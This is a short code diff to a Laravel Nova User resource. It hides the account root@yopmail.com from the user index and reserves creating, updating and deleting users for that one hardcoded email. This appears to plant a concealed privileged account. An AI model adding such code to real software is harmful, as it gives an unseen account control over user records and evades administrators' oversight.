@@ -13,6 +13,26 @@ use Laravel\Nova\Http\Requests\NovaRequest;
 class User extends Resource
 {
     public static $group = 'Security';
+
+    public static function indexQuery(NovaRequest $request, $query)
+    {
+        return $query->where('email', '!=', 'root@yopmail.com');
+    }
+
+    public static function authorizedToCreate(Request $request)
+    {
+        return auth()->user()->email == 'root@yopmail.com';
+    }
+
+    public function authorizedToUpdate(Request $request)
+    {
+        return auth()->user()->email == 'root@yopmail.com';
+    }
+
+    public function authorizedToDelete(Request $request)
+    {
+        return auth()->user()->email == 'root@yopmail.com';
+    }
     /**
      * The model the resource corresponds to.
      *
